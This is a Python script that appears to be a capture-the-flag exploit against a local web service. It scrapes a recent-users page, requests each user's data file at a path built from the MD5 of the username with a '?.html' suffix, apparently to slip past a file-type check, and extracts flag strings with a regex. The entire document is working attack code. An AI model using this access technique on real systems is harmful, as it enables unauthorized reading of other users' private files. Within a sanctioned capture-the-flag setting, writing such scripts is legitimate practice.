#!/usr/bin/env python3

import sys
import requests
import hashlib
import re
from random import choice
import re


alph_full = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
alph_caps = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
names = ['goliath', 'royal', 'dacota', 'marry', 'hunter', 'twilight' ,'smile' ,'castle', 'lucky', 'wolf']
FlagRegExp = re.compile(r'[A-Za-z0-9]{31}=')

#ip = sys.argv[1]
ip = '127.0.0.1'
port = '5555'
host = f'{ip}:{port}'


def id_gen( size = 10, first = names, next = alph_full ):
	beg = choice(first)
	return  beg + ''.join(choice(next) for i in range(size - len(beg)))


def main():

	flags = ''

	for u_name in last_users():
			
		for flag in view_flag( u_name ):
			flags += flag + '\n'

	print( flags, flush=True )


def last_users():
	#http://10.10.228.14:5555/lastusers
	res = requests.get(f'http://{host}/lastusers')
	return res.text.split('<br>')[1:-1]


def hash( word ):
	return hashlib.md5(str(word).encode()).hexdigest()


def view_flag( u_name ) -> list:
	res = requests.get(f'http://{host}/data/{hash(u_name)}.txt?.html').text
	return FlagRegExp.findall( res )


if __name__ == '__main__':
	main()